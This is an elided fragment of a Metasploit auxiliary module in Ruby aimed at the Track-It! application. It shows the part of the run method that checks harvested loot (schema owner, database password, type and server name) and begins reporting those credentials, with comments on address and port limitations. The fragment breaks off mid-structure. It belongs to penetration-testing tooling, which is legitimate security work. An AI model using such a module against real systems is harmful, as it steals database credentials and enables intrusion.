...
class Metasploit3 < Msf::Auxiliary
  ...
  def run
    ...
    if loot[schema_owner] and loot[database_pw] and loot[database_type] and loot[database_server_name]
      service_data = {
        # database_server_name is the name of the host that is running the database.
        # Due to limitations of the Credential API we cannot report a hostname but have to report a numeric IP.
        # What this means in practice is that we might be reporting an incorrect address, as the database might
        # be running in a different host than the one running the Track-It! application. However in most cases
        # rhost == database_server_name as Track-It! is quite a lightweight app.
        #
        # Also we can't get the database port number from packet_reply, so set it to 0.
        address: rhost,
        port: 0,
